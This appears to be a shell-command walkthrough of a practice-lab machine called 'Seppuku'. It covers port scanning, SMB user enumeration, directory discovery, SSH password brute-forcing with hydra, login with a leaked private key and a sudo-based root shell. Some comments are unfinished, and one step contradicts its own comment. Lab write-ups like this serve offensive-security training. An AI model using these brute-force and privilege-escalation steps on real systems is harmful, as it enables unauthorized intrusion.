# Create variable for target VM
TARGET_IP="192.168.193.90"
WORKING_DIR="/home/brian/Documents/ProvingGrounds/Seppuku/"

# nmap
nmap $TARGET_IP -sC -sV -O -A -p 21,22,80,139,445,7080,7601,8088 -oN scan.txt


# We see that SMB is open
enum4linux $TARGET_IP | tee enum4linux.txt
# Accounts found: seppuku, samurai, tanto

# Create a list of users and call it users.txt
echo -e "seppuku\nsamurai\ntanto" > users.txt

# Use FeroxBuster to get a list of directories on port 7601
feroxbuster -u http://$TARGET_IP:7601

# We found a file called secret/password.lst

# Download file using wget
wget http://$TARGET_IP:7601/secret/password.lst -P $WORKING_DIR -O password.lst

# Use hydra to brute force the password from the earlier found accounts
hydra -L users.txt -P password.lst $TARGET_IP ssh
#seppuku:eeyoree
#.passwd = 12345685213456!@!@A
#cat /etc/passwd

ssh samurai@$TARGET_IP
# So samurai can run /home/tanto/.cgi_bin/bin /tmp* as root
# We need to create 


# We download /keys/private and SSH into the box
wget http://$TARGET_IP:7601/keys/private -O private
ssh -i private tanto@$TARGET_IP -t "bash --noprofile"

# We are in as tanto, create the .cgi_bin/bin that opens root shell 
mkdir .cgi_bin
cd .cgi_bin/
echo "/bin/bash" > bin
chmod 777 bin

# Run the script as samurai
sudo -u samurai /home/tanto/.cgi_bin/bin

# We are now root
find / -iname "local.txt"
find / -iname "proof.txt"





